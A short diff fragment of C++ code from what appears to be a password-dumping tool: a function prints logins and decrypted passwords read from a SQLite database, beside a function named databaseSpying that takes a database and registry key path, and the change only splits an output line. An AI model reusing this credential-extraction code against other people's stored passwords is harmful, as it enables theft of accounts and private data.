@@ -68,7 +68,8 @@ void printPassword(sqlite3_stmt *stmt)
 	// display login
 	std::cout << "Login:\t" << sqlite3_column_text(stmt, 1) << std::endl;
 	// decrypt and display password
-	std::cout << "Password:\t" << uncryptData((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2)) << std::endl << std::endl;
+	std::cout << "Password:\t" << uncryptData((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2));
+	std::cout << std::endl << std::endl;
 }
 
 void databaseSpying(const char *dbFilePath, const char *regKeyPath, int folder) 
